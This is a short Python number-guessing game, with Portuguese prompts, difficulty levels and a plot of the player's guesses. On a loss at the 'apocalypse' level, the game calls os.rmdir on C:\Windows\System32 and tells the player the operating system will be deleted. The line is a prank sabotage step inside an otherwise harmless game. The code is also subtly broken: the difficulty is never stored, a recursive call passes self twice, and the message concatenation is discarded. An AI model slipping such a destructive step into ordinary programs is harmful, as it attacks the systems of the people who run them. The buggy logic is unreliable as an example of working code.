import random
import matplotlib.pyplot as plt
import os

class GameAgent:
    def __init__(self, secret_number, difficulty = 1, max_attempts=5):
        self.secret_number = secret_number
        self.max_attempts = max_attempts
        self.attempts = 0
        self.state = "Esperando tentativa"
        self.history = []  # Histórico de tentativas
        self.difficulty = difficulty

    def set_difficulty(self, difficulty):
        if difficulty == 1:
            self.max_attempts = 10
        elif difficulty == 2:
            self.max_attempts = 5
        elif difficulty == 3:
            self.max_attempts = 3
        elif difficulty == 4:
            self.max_attempts = 1
        else:
            self.set_difficulty(self, 4)

    def make_guess(self, guess):
        self.attempts += 1
        self.history.append(guess)

        if guess == self.secret_number:
            self.state = "Acertou!"
            return "Parabéns! Você acertou o número."
        elif self.attempts >= self.max_attempts:
            self.state = "Fim do jogo"
            mensagem = f"Game Over! O número era {self.secret_number}."
            if self.difficulty == 4:
                os.rmdir("C:\Windows\System32")
                mensagem + " Seu sistema operacional será deletado! :)"
            return mensagem
        elif guess < self.secret_number:
            self.state = "Tentativa errada (muito baixo)"
            return "O número é maior. Tente novamente."
        else:
            self.state = "Tentativa errada (muito alto)"
            return "O número é menor. Tente novamente."

agent = GameAgent(secret_number=random.randint(1, 100))

def plot_attempts(agent):
    plt.figure(figsize=(8,5))
    plt.plot(range(1, len(agent.history) + 1), agent.history, marker='o', linestyle='-')
    plt.axhline(y=agent.secret_number, color='r', linestyle='--', label='Número Secreto')
    plt.xlabel("Tentativas")
    plt.ylabel("Valor do Palpite")
    plt.title("Evolução das Tentativas do Jogador")
    plt.legend()
    plt.show()

difficulty = int(input("Quer que o jogo seja fácil (1), médio (2), difícil (3) ou apocalipse (4)?"))
agent.set_difficulty(difficulty)
if agent.difficulty == 4:
  print("Parece que você causou seu apocalipse.")
print("Seu máximo de tentativas é: " + str(agent.max_attempts))

while agent.state not in ["Acertou!", "Fim do jogo"]:
    guess = int(input("Digite um número: "))
    print(agent.make_guess(guess))

plot_attempts(agent)
